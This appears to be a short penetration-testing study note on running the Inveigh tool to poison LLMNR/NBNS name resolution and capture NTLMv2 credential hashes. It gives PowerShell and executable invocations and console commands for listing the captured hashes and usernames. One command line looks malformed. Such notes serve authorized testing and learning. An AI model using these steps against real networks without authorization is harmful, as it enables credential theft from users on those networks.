# Inveigh
By using tool [Inveigh](https://github.com/Kevin-Robertson/Inveigh) and attempt to capture another set of credentials. [Inveigh](https://github.com/Kevin-Robertson/Inveigh) works similar to Responder, but is written in PowerShell and C#. Inveigh can listen to IPv4 and IPv6 and several other protocols, including `LLMNR`, DNS, `mDNS`, NBNS, `DHCPv6`, ICMPv6, `HTTP`, HTTPS, `SMB`, LDAP, `WebDAV`, and Proxy Auth.

On powershell (Open as admin)
``` powershell
Import-Module .\Inveigh.ps1
(Get-Command Invoke-Inveigh).Parameters
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```


##### Its recommend to use C# Inveigh as powershell one not supported 
Inveigh [v2.0.11](https://github.com/Kevin-Robertson/Inveigh/releases/tag/v2.0.11)
steps on powershell (opened as admin)
```powershell-session
.\Inveigh.exe
```
_Note_: During capturing you can Press ESC to enter/exit interactive console, After typing `HELP` and hitting enter, we are presented with several options:
- We can quickly view unique captured hashes by typing `GET NTLMV2UNIQUE`
- We can type in `GET NTLMV2USERNAMES` and see which usernames we have collected.
